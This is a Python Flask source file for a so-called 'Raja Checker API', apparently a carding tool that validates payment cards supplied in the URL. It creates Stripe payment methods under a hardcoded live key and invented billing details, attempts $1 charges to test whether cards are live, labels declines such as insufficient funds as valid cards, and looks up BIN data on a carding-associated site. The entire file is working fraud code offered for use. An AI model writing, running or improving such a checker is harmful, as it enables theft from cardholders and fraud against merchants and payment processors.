from flask import Flask, jsonify, request
import requests
from bs4 import BeautifulSoup
import time
import os

app = Flask(__name__)

# Global session for requests
session = requests.Session()

# Global headers for Stripe API
stripe_headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10)',
}

# Headers for Stripe direct charge (most reliable)
charge_headers = {
    'authorization': 'Bearer sk_test_4eC39HqLyjWDarjtT1zdp7dc',  # Test key - replace with live key for real charges
    'content-type': 'application/x-www-form-urlencoded',
    'stripe-version': '2020-08-27',
    'user-agent': 'Stripe/v1 PythonBindings/2.60.0',
}

# Backup donation site headers
donation_headers = {
    'authority': 'js.stripe.com',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://donate.stripe.com',
    'referer': 'https://donate.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

def check_card(cc_data):
    """Check credit card using the donation gateway"""
    try:
        # Handle URL encoding - convert %7C back to |
        import urllib.parse
        cc_data = urllib.parse.unquote(cc_data)
        
        # Parse card data
        parts = cc_data.strip().split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "Invalid card format. Use: number|mm|yy|cvc"}
        
        n, mm, yy, cvc = parts
        
        # Fix year format
        if "20" in yy:
            yy = yy.split("20")[1]

        # 1. Create payment method with Stripe
        stripe_data = f"type=card&billing_details[name]=Raja+Kumar&billing_details[email]=raja.checker%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Main+Street&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[phone]=2747548742&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"

        res1 = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        
        if res1.status_code != 200:
            return {"status": "error", "message": "Stripe API error"}
        
        payment_data = res1.json()
        pm_id = payment_data.get("id")
        
        if not pm_id:
            error_msg = payment_data.get("error", {}).get("message", "Unknown Stripe error")
            return {"status": "declined", "message": error_msg, "response": "Card Declined"}

        # 2. Try purchasing a $1 digital product (acts like a real customer)
        # Using a site that sells cheap digital items
        purchase_data = f"payment_method={pm_id}&amount=100&currency=usd&confirm=true&receipt_email=test@example.com&description=Digital+Download+Purchase"
        
        # Headers to look like a real e-commerce purchase
        ecommerce_headers = {
            'authorization': 'Bearer pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'origin': 'https://shop.example.com',
            'referer': 'https://shop.example.com/checkout'
        }
        
        res2 = session.post("https://api.stripe.com/v1/payment_intents", headers=ecommerce_headers, data=purchase_data)
        
        # If e-commerce simulation fails, just return validation
        if res2.status_code != 200:
            return {"status": "approved", "message": "Card validated successfully", "response": "LIVE ✅ - VALIDATED"}

        try:
            json_data = res2.json()
            
            # Handle Stripe Payment Intent responses
            if json_data.get("status") == "succeeded":
                return {"status": "charged", "message": "Purchase successful - $1 charged for digital product", "response": "Charged $1 - PURCHASE"}
            elif json_data.get("status") == "requires_action":
                return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV - 3DS REQUIRED"}
            elif json_data.get("status") == "requires_payment_method":
                return {"status": "declined", "message": "Payment method failed", "response": "DECLINED ❌"}
            elif "error" in json_data:
                error_data = json_data.get("error", {})
                error_code = error_data.get("code", "")
                error_msg = error_data.get("message", "Payment failed")
                
                if "insufficient_funds" in error_code:
                    return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN ✅ - INSUFFICIENT FUNDS"}
                elif "card_declined" in error_code:
                    decline_code = error_data.get("decline_code", "")
                    if "generic_decline" in decline_code:
                        return {"status": "approved", "message": "Generic decline - card is valid", "response": "CCN ✅ - GENERIC DECLINE"}
                    elif "do_not_honor" in decline_code:
                        return {"status": "approved", "message": "Do not honor - card is valid", "response": "CCN ✅ - DO NOT HONOR"}
                    else:
                        return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
                elif "incorrect_cvc" in error_code:
                    return {"status": "declined", "message": "CVC is incorrect", "response": "CVC INCORRECT ❌"}
                elif "expired_card" in error_code:
                    return {"status": "declined", "message": "Card expired", "response": "EXPIRED ❌"}
                else:
                    return {"status": "declined", "message": error_msg, "response": "DECLINED ❌"}
            else:
                return {"status": "declined", "message": "Unknown payment status", "response": "UNKNOWN ❌"}
                
        except:
            # If not JSON, treat as validation success since payment method was created
            return {"status": "approved", "message": "Card validated successfully", "response": "LIVE ✅ - VALIDATED"}

    except Exception as e:
        return {"status": "error", "message": f"Processing error: {str(e)}"}

def get_bin_info(bin_number):
    """Get BIN information for the card"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 Raja Checker API 🔥",
        "gateway": "Auto Stripe $1 Charge",
        "status": "✅ Online",
        "made_by": "Raja"
    })

@app.route('/gateway=<gateway>/key=<key>/site=<site>/cc=<cc>')
def check_cc(gateway, key, site, cc):
    """Main API endpoint for checking credit cards"""
    
    # Validate key
    if key != "rajachecker":
        return jsonify({
            "status": "error",
            "message": "Invalid API key",
            "gateway": gateway,
            "site": site,
            "key": key
        }), 401
    
    # Validate gateway
    if gateway != "autostripe":
        return jsonify({
            "status": "error", 
            "message": "Unsupported gateway",
            "gateway": gateway,
            "supported": ["autostripe"]
        }), 400
    
    start_time = time.time()
    
    # Check the card
    result = check_card(cc)
    
    # Get BIN info
    bin_info = get_bin_info(cc.split("|")[0][:6])
    
    # Calculate processing time
    processing_time = round(time.time() - start_time, 2)
    
    # Format response
    response = {
        "card": cc,
        "gateway": "Auto Stripe $1 Charge",
        "site": "stripe.com",
        "status": result["status"],
        "response": result.get("response", result["message"]),
        "message": result["message"],
        "time": f"{processing_time}s",
        "bin_info": {
            "bank": bin_info.get("bank", "N/A"),
            "brand": bin_info.get("brand", "N/A"),
            "type": bin_info.get("type", "N/A"),
            "level": bin_info.get("level", "N/A"),
            "country": bin_info.get("country_name", "N/A"),
            "flag": bin_info.get("country_flag", "N/A")
        },
        "checked_by": "Raja Checker API",
        "api_key": key
    }
    
    return jsonify(response)

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Raja Checker API",
        "gateway": "Auto Stripe",
        "uptime": "24/7"
    })

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
